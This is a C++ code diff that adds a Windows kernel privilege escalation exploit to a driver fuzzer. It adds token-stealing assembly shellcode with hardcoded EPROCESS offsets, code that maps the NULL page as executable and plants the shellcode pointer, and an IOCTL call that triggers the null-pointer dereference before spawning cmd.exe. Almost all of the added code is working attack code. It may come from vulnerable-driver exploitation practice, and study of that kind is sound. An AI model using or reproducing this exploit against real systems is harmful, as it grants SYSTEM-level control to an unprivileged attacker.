@@ -9,6 +9,40 @@
 
 #include <windows.h>
 
+#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
+#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
+#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
+#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
+#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
+#define SYSTEM_PID        0x004    // SYSTEM Process PID
+
+namespace MyProgam {
+  void TokenStealingShellcode() {
+    __asm {
+      pushad
+
+      xor eax, eax
+      mov eax, fs:[eax + KTHREAD_OFFSET]
+      mov eax, [eax + EPROCESS_OFFSET]
+
+      mov ecx, eax
+
+      mov ebx, [eax + TOKEN_OFFSET]
+      mov edx, SYSTEM_PID
+
+      SearchSystemPID:
+        mov eax, [eax + FLINK_OFFSET]
+        sub eax, FLINK_OFFSET
+        cmp [eax + PID_OFFSET], edx
+        jne SearchSystemPID
+
+        mov edx, [eax + TOKEN_OFFSET]
+        mov [ecx + TOKEN_OFFSET], edx
+        popad
+    }
+  }
+}
+
 MyProgram::DriverFuzzer::
 DriverFuzzer(std::string sDriverName) {
   m_hDriver = CreateFileA(
@@ -122,6 +156,78 @@ AutoFuzzIOCTLBuffer(
   }
 
   return TRUE;
+}
+
+VOID
+MyProgram::DriverFuzzer::
+ExploitVulnerability() {
+  using PNtAllocateVirtualMemory = NTSTATUS(WINAPI*)(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG ZeroBits,
+    PULONG AllocationSize,
+    ULONG AllocationType,
+    ULONG Protect
+  );
+  HMODULE hNtDll = NULL;
+
+  PNtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
+  // Cannot pass NULL directly, but it will be rounded to 0;
+  PVOID pBaseAddress = PVOID(0x01);
+  PULONG pNullPtrDereference = PULONG(ULONG(0x04));
+  // This value will be rounded to page size
+  ULONG ulRegionSize = 0xff;
+  std::stringstream sErrMsg;
+  DWORD dwBuffer = 0x00;
+
+  hNtDll = GetModuleHandleA("ntdll.dll");
+  if (!hNtDll) {
+    _LogErrorCode("GetModuleHandleA failed", GetLastError());
+    return;
+  }
+
+  pNtAllocateVirtualMemory = reinterpret_cast<PNtAllocateVirtualMemory>(
+    GetProcAddress(hNtDll, "NtAllocateVirtualMemory")
+  );
+  if (!pNtAllocateVirtualMemory) {
+    // No need to dispose hNtDll
+    _LogErrorCode("Resolving NtAllocateVirtualMemory failed", GetLastError());
+    return;
+  }
+
+  // Map to NULL page
+  NTSTATUS ntStatus = pNtAllocateVirtualMemory(
+    GetCurrentProcess(),
+    &pBaseAddress,
+    NULL,
+    &ulRegionSize,
+    // Reserve and commit in one step,
+    // allocate memory at the highest possible address
+    MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
+    PAGE_EXECUTE_READWRITE
+  );
+
+  if (ntStatus != ERROR_SUCCESS) {
+    _LogErrorCode("NtAllocateVirtualMemory failed", ntStatus);
+    return;
+  }
+
+  auto cPrevFill = std::cout.fill('0');
+  std::cout << std::hex
+    << "Memory allocated at: 0x" << std::setw(8) << pBaseAddress << '\n'
+    << "Allocated memory size: 0x" << std::setw(8) << ulRegionSize << '\n';
+
+  std::cout.fill(cPrevFill);
+
+  *pNullPtrDereference = ULONG(&MyProgam::TokenStealingShellcode);
+  
+  _CheckIOCTL(
+    FILE_DEVICE_UNKNOWN, 0x90a, METHOD_NEITHER, FILE_ANY_ACCESS,
+    &dwBuffer, sizeof(dwBuffer), NULL, 0, {}
+  );
+
+  system("cmd.exe");
+  std::cout << "Exploit completed\n";
 }
 
 VOID
